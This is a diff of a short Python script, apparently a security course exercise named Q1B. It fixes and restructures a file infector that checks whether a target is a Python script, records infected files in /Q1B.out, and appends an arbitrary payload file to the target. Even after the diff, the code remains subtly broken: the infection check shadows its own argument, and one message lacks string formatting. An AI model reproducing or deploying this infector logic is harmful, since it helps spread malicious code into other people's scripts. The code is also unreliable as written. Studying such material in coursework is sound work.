@@ -1,22 +1,26 @@
 import sys
 
 def is_infected(file):
-    with open(out_path, "r") as file:
-        for row in file:
-            if row == f"{file}\n":
-                return True     
-    return False
-
+    out_path = "/Q1B.out"
+    try:
+        with open(out_path, "r") as file:
+            for row in file:
+                if row == f"{file}\n":
+                    return True     
+        return False
+    except:
+        return False
+    
 def is_script(file):
+    required_statement = 'if __name__ == "__main__":'
     with open(file, "r") as file:
         for row in file:
-            if row.strip == required_statement:
+            if row.strip() == required_statement:
                 return True
     return False
 
 def verify(target_file):
     is_python_script = False
-    required_statement = 'if __name__ == "__main__":'
 
     if not is_script(target_file):
         print("Could not verify file is python script; no {required_statement} statement.")
@@ -29,7 +33,7 @@ def verify(target_file):
 
 def inject(target_file, payload_file):
     try: 
-        with open(target_file, "a") as target_file, with open(payload_file, "r") as payload_file:
+        with open(target_file, "a") as target_file, open(payload_file, "r") as payload_file:
             target_file.write(payload_file.read())
             return 0
     except:
@@ -40,16 +44,16 @@ def inject(target_file, payload_file):
 
 
 
-def main()
-    target_file = sys.argv[1]
-
+def main():
     if len(sys.argv) != 2:
         print("Usage: python3 Q1B.py [target_file]\n")
-    out_path = "/Q1B.out"
+        return 1
+    
+    target_file = sys.argv[1]
 
     is_verified = verify(target_file)
-    if is_verified:
-        print("Verification failed\n Quitting...")
+    if not is_verified:
+        print("Verification failed\nQuitting...")
         return 1
 
 
@@ -59,3 +63,4 @@ def main()
 
     return 0
     
+main()
